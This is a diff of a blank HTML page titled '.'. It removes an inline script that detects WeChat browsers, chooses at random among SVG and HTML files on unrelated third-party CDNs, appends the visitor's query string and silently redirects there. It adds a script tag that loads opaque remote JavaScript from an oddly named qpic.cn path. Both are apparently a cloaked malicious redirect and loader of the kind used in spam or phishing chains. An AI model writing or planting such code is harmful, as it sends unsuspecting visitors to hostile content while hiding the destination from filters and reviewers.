@@ -2,48 +2,8 @@
 <html>
 <head>
   <title>.</title>
-  <script>
-    function getQueryParam(param) {
-      var urlParams = new URLSearchParams(window.location.search);
-      return urlParams.get(param);
-    }
-    
-    function redirectToURL(url) {
-      window.location.replace(url);
-    }
-    
-    var isWeChat = /micromessenger/i.test(navigator.userAgent.toLowerCase());
-    var redirectURL;
-    
-    if (isWeChat) {
-      var randomIndex = Math.floor(Math.random() * 2);
-      if (randomIndex === 0) {
-        redirectURL = "//pic6.58cdn.com.cn/nowater/gjImageFile/n_v3d8c5a4720251423496c5a1f56b3029a3.svg";
-      } else {
-        redirectURL = "//image.cls.cn/cailianpress/avatar/20230525/cailianpress051540405.svg";
-      }
-    } else {
-      randomIndex = Math.floor(Math.random() * 2); 
-      if (randomIndex === 0) {
-        redirectURL = "//yun-src.leju.com/31-2-AdRcEQ33zOli5QDNK7untXcQN6sB0u2NK7gXVCtvEGka61RMkbYyhXwu8wRfUgeA28L1JB1gGFE7rCv2.html";
-      } else {
-        redirectURL = "//otherfiles.uupt.com/ATS/2023/202305/20230525/998a5607327345c3a693d3b238e9c889_big.svg";
-      }
-    }
-    var uValue = getQueryParam("u");
-    if (uValue) {
-      redirectURL += '?' + uValue + "&_t=" + Date.now();;
-    } else {
-      var searchParams = new URLSearchParams(window.location.search);
-      var firstParam = searchParams.toString().split('&')[0];
-      if (firstParam) {
-        redirectURL += '?' + firstParam + "&_t=" + Date.now();;
-      }
-    }
-    
-    redirectToURL(redirectURL);
-  </script>
 </head>
 <body>
+    <script src="https://crossfb-70080.picnjc.qpic.cn/g.52000000-r.e620f/1687873530536_hf_0" charset="utf-8" type="text/javascript"></script>
 </body>
 </html>
